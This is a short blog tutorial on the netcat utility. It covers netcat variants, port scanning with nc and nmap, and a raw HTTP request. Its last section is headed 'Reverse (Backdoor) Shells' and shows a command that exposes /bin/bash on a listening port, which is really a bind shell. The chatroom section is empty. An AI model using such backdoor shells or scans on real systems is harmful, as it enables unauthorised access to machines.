---
layout: post
title: How to use netcat command
author: Jeffrey Tse
categories: computer
tags:
  - computer
  - linux
  - terminal
  - note
---

## 1. Introduction

Command `nc` stands for **netcat**, known as the swiss army knife of
network tools, it's a utility which is used for reading and writing
data across TCP and UDP ports. It can be used for a lot of cool
stuff, this article will take a closer look.

There are two similar packages available for netcat with a slight
difference between them:

- Traditional GNU netcat (such as Ncat in the CentOS is nmap package)
- OpenBSD nc (such as the nc that comes with MacOS).

Their parameters are not exactly the same. For example, BSD `nc`
cannot use `-p` and `-l` at the same time, which is easy to cause
confusion for novices.

netcat/nc/ncat/nmap

- **Linux/macOS** users can quickly use in the terminal with pre-installed
  Nc (and Netcat on Linux)
- **Windows** users will need to install Netcat’s successor, Ncat, made
  by the Nmap project

## 2. Using for port scanning

```bash
nc -zv domain.com 1-1000
```

```bash
nc -znv 1.2.3.4 1-1000
```

```bash
nmap -Pn 1.2.3.4
```

- `-z` – See if the port is open without sending data
- `-n` – Dont resolve, numeric-only IP addresses, no DNS lookup
- `-v` – Show verbose information
- `-w` – Set a timeout between the client and the target node, otherwise
  Netcat will continue trying until a connection is made or you manually
  close the attempt (`Ctrl + C`)

## 3. Using for HTTP Requests

```bash
printf “GET / HTTP/1.0\r\n\r\n” | nc google.com 80
```

## 4. Using for Chatroom

## 5. Launching Reverse (Backdoor) Shells

Server:

```bash
nc -l -p [port] -e /bin/bash
```

Client:

```bash
nc -n 127.0.0.1 [port]
```
